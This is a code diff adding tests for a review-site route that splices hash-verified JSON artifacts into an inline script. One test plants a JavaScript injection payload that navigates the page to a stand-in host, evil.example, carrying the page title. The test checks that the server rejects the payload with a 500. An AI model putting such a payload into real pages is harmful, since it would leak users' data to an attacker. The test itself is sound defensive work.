@@ -345,8 +345,9 @@ describe("review-site route (booted app over HTTP)", () => {
   it("an undeclared sentinel (not in data_sources) → 500, never served live (F2)", async () => {
     const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
     try {
-      // A placeholder for a global data_sources never mentions: the loop would
-      // skip it and the document would ship a live sentinel string.
+      // A placeholder for a global data_sources never mentions: without the
+      // template pre-scan the loop would skip it and the document would ship a
+      // live sentinel string.
       const html = await readFile(site(tasksDir), "utf8");
       await writeFile(
         site(tasksDir),
@@ -357,7 +358,61 @@ describe("review-site route (booted app over HTTP)", () => {
       );
       const res = await get(`${base}${INDEX}`);
       assert.equal(res.status, 500);
-      assert.match(res.body, /unreplaced injection sentinel/);
+      assert.match(res.body, /has no data_sources entry/);
+    } finally {
+      server.close();
+    }
+  });
+
+  it("a non-JSON artifact (JS statement payload) → 500, nothing served", async () => {
+    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
+    try {
+      // The sentinel is replaced UNQUOTED, so bytes that are JS statements —
+      // here a navigation exfil sink the CSP cannot block — would become
+      // executable script. The hash is declared honestly (a malicious worker
+      // controls both artifact and manifest), so only the JSON check stands
+      // between these bytes and the inline <script>.
+      const payload = '1; window.location="https://evil.example/?d="+document.title; var _={}';
+      const artifact = path.join(tasksDir, TASK_ID, "artifacts", "landmarks", "geometry.json");
+      await writeFile(artifact, payload);
+      const hash = createHash("sha256").update(payload).digest("hex");
+      const html = await readFile(site(tasksDir), "utf8");
+      await writeFile(
+        site(tasksDir),
+        html.replace(/landmarks\/geometry\.json@[0-9a-f]{64}/, `landmarks/geometry.json@${hash}`),
+      );
+
+      const res = await get(`${base}${INDEX}`);
+      assert.equal(res.status, 500);
+      assert.match(res.body, /not valid JSON/);
+      assert.doesNotMatch(res.body, /evil\.example/, "must not serve the payload bytes");
+    } finally {
+      server.close();
+    }
+  });
+
+  it("a valid-JSON artifact containing a literal sentinel marker string still serves 200", async () => {
+    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
+    try {
+      // Legitimate, hash-verified data whose VALUE happens to contain the
+      // marker: a post-splice residual scan would false-500 it; the template
+      // pre-scan must not.
+      const data = { meshes: { note: "__REVIEW_INJECT:FOO__", quoted: '"__REVIEW_INJECT:BAR__"' } };
+      const bytes = JSON.stringify(data);
+      const artifact = path.join(tasksDir, TASK_ID, "artifacts", "landmarks", "geometry.json");
+      await writeFile(artifact, bytes);
+      const hash = createHash("sha256").update(bytes).digest("hex");
+      const html = await readFile(site(tasksDir), "utf8");
+      await writeFile(
+        site(tasksDir),
+        html.replace(/landmarks\/geometry\.json@[0-9a-f]{64}/, `landmarks/geometry.json@${hash}`),
+      );
+
+      const res = await get(`${base}${INDEX}`);
+      assert.equal(res.status, 200);
+      const m = res.body.match(/window\.REVIEW_GEOMETRY = (.+);/);
+      assert.ok(m, "expected an intact single-line REVIEW_GEOMETRY assignment");
+      assert.deepEqual(JSON.parse(m![1]!), data);
     } finally {
       server.close();
     }
